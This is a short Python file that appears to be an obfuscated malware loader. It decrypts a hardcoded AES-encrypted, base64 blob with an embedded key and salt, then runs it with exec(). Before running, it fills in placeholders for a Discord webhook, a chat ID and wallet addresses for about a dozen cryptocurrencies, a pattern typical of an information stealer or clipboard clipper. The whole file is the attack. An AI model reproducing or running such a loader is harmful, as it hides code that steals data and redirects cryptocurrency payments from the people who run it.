
import base64
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA512
from Crypto.Util.Padding import unpad

def decrypt(encdata, masterkey, salt):
    encdata_bytes = base64.b64decode(encdata)
    salt_bytes = base64.b64decode(salt)
    iv = encdata_bytes[:16]
    ciphertext_bytes = encdata_bytes[16:]
    key = PBKDF2(masterkey.encode('utf-8'), salt_bytes, dkLen=32, count=1000000, hmac_hash_module=SHA512)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_bytes = cipher.decrypt(ciphertext_bytes)
    decrypted_text = unpad(decrypted_bytes, AES.block_size).decode('utf-8')
    return decrypted_text

decrypted = decrypt("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", "4fUhxBvFt6yjxvlP/IPl5A==")
exec(decrypted.replace("%WEBHOOKURL%", "%DISCORD%").replace("%CHATID%", "%USERID%").replace("%BTCADDRESS%", "%ADDRESSBTC%").replace("%ETHADDRESS%", "%ADDRESSETH%").replace("%DOGEADDRESS%", "%ADDRESSDOGE%").replace("%LTCADDRESS%", "%ADDRESSLTC%").replace("%XMRADDRESS%", "%ADDRESSXMR%").replace("%BCHADDRESS%", "%ADDRESSBCH%").replace("%DASHADDRESS%", "%ADDRESSDASH%").replace("%TRXADDRESS%", "%ADDRESSTRX%").replace("%XRPADDRESS%", "%ADDRESSXRP%").replace("%XLMADDRESS%", "%ADDRESSXLM%").replace("%SHOWERROR%", "%ERRORSTATUS%"))
